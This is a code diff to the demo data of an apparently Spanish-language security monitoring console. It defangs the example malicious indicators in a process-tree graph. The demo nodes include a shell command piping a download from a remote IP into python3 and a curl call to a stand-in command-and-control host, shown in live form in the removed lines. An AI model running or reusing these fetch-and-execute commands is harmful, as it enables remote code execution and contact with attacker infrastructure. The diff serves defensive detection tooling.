@@ -1036,12 +1036,15 @@ const DEMO_ALERTAS = [
   categoria, tecnica_mitre: tecnica, tactica_mitre: '', descripcion, recibido_en: hace(min),
 }));
 
+// Los indicadores maliciosos de la demostracion van DESACTIVADOS (hxxp://,
+// dominio[.]tld), como se muestran en un SOC: ni se pueden pulsar por error ni
+// parecen un recurso que la consola cargue (tests/panel.rs lo vigila).
 const DEMO_GRAFO_NODOS = [
   { clave: 1, padre: 0, creador: 0, profundidad: 0, imagen: '/usr/lib/systemd/systemd', cmdline: 'systemd --user', pid: 1, taints: 0, puntuacion: 0, terminado_ns: 0 },
   { clave: 2, padre: 1, creador: 1, profundidad: 1, imagen: '/usr/bin/soffice.bin', cmdline: 'soffice.bin --calc /tmp/factura.xlsx', pid: 3120, taints: 0, puntuacion: 10, terminado_ns: 0 },
-  { clave: 3, padre: 2, creador: 2, profundidad: 2, imagen: '/bin/sh', cmdline: 'sh -c "curl -s http://185.x/x | python3 -"', pid: 3140, taints: 3, puntuacion: 55, terminado_ns: 0 },
+  { clave: 3, padre: 2, creador: 2, profundidad: 2, imagen: '/bin/sh', cmdline: 'sh -c "curl -s hxxp://185[.]x/x | python3 -"', pid: 3140, taints: 3, puntuacion: 55, terminado_ns: 0 },
   { clave: 4, padre: 3, creador: 3, profundidad: 3, imagen: '/usr/bin/python3', cmdline: 'python3 -', pid: 3141, taints: 3, puntuacion: 82, terminado_ns: 0 },
-  { clave: 5, padre: 4, creador: 4, profundidad: 4, imagen: '/usr/bin/curl', cmdline: 'curl -s https://c2.example/task', pid: 3155, taints: 1, puntuacion: 40, terminado_ns: 0 },
+  { clave: 5, padre: 4, creador: 4, profundidad: 4, imagen: '/usr/bin/curl', cmdline: 'curl -s hxxps://c2[.]example/task', pid: 3155, taints: 1, puntuacion: 40, terminado_ns: 0 },
 ];
 
 const DEMO_REGLAS = [
